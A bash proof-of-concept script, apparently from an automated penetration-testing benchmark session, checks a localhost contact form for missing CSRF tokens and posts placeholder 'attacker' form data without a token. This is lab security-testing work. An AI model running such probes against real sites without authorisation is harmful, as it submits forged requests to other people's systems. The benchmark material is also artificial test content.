#!/bin/bash
# POC: Demonstrates CSRF vulnerability on contact form by showing form lacks CSRF token protection and can be exploited via cross-site requests
# Target: ./repo
# Created: 2025-11-05T17:25:27.901Z
# Session: benchmark-XBEN-026-24-mhm9hrna

# CSRF Vulnerability POC - Contact Form
# This script demonstrates the absence of CSRF protection on the contact form

TARGET_URL="http://localhost/"
CSRF_CHECK_RESULT="NOT_FOUND"
FORM_SUBMISSION_TEST="FAILED"

echo "========================================"
echo "CSRF Vulnerability Test - Contact Form"
echo "========================================"
echo ""

# Step 1: Check for CSRF tokens/nonces in the form
echo "[*] Step 1: Checking for CSRF tokens/nonces in contact form..."
FORM_HTML=$(curl -s "$TARGET_URL")

# Check for common CSRF protection indicators
if echo "$FORM_HTML" | grep -q 'csrf\|_token\|nonce\|__RequestVerificationToken'; then
    CSRF_CHECK_RESULT="FOUND"
    echo "[+] CSRF protection tokens/nonces detected in HTML"
else
    CSRF_CHECK_RESULT="NOT_FOUND"
    echo "[-] No CSRF tokens/nonces found in form HTML (VULNERABLE)"
fi

# Step 2: Extract and analyze the contact form
echo ""
echo "[*] Step 2: Extracting contact form HTML..."
CONTACT_FORM=$(echo "$FORM_HTML" | grep -A 20 'contact-form\|id="contact\|class="contact' | head -30)

if [ -z "$CONTACT_FORM" ]; then
    echo "[-] Contact form HTML:"
    CONTACT_FORM=$(echo "$FORM_HTML" | grep -A 20 '<form' | head -30)
fi

echo "$CONTACT_FORM"
echo ""

# Step 3: Attempt CSRF form submission test
echo "[*] Step 3: Testing CSRF vulnerability via form submission..."
echo "[-] Simulating attacker's cross-site form submission..."

# Create test form data
TEST_NAME="Attacker Name"
TEST_EMAIL="attacker@example.com"
TEST_MESSAGE="This is a CSRF attack message"

# Attempt POST to contact form without CSRF token
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "name=$TEST_NAME&email=$TEST_EMAIL&message=$TEST_MESSAGE" \
  -H "Content-Type: application/x-www-form-urlencoded")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "[-] POST request sent without CSRF token"
echo "[-] HTTP Response Code: $HTTP_CODE"

if [ "$HTTP_CODE" == "200" ] || [ "$HTTP_CODE" == "201" ] || [ "$HTTP_CODE" == "302" ]; then
    FORM_SUBMISSION_TEST="SUCCESS"
    echo "[-] Form accepted submission without CSRF token (VULNERABLE!)"
else
    echo "[?] Submission returned code $HTTP_CODE (may indicate CSRF protection or other validation)"
fi

# Step 4: Summary
echo ""
echo "========================================"
echo "CSRF Vulnerability Assessment Summary"
echo "========================================"
echo ""
echo "CSRF Token Detection:     $CSRF_CHECK_RESULT"
echo "Form Submission Without Token: $FORM_SUBMISSION_TEST"
echo ""

if [ "$CSRF_CHECK_RESULT" == "NOT_FOUND" ]; then
    echo "[VULNERABLE] Contact form lacks CSRF token protection!"
    echo "The form does not include CSRF tokens, nonces, or other anti-CSRF mechanisms."
    echo "An attacker could craft a malicious page to submit form data on behalf of users."
    exit 0
else
    echo "[OK] CSRF protection tokens detected"
    exit 1
fi